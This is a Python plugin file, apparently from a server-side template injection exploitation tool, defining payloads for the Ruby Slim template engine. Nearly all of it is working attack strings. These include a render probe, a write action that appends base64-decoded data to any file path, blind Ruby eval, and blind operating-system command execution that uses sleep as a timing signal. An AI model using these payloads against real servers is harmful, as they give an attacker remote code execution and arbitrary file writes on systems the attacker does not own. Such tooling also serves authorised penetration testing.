from utils.strings import quote
from plugins.languages import ruby
from utils.loggers import log
from utils import rand
import base64
import re

class Slim(ruby.Ruby):

    def init(self):

        self.update_actions({
            'render' : {
                'render': '"#{%(code)s}"',
                'header': """=('%(header)s'+""",
                'trailer': """+'%(trailer)s')""",
            },
            'write' : {
                'call' : 'inject',
                'write': """=(require'base64';File.open('%(path)s', 'ab+') {|f| f.write(Base64.urlsafe_decode64('%(chunk_b64)s')) })""",
                'truncate' : """=(File.truncate('%(path)s', 0))"""
            },
            'evaluate_blind' : {
                'call': 'inject',
                'evaluate_blind': """=(require'base64';eval(Base64.urlsafe_decode64('%(code_b64)s'))&&sleep(%(delay)i))"""
            },
            'execute_blind' : {
                'call': 'inject',
                'execute_blind': """=(require'base64';%%x(#{Base64.urlsafe_decode64('%(code_b64)s')+' && sleep %(delay)i'}))"""
            },
        })

        self.set_contexts([

            # Text context, no closures
            { 'level': 0 },
            
            # TODO: add contexts
            
        ])
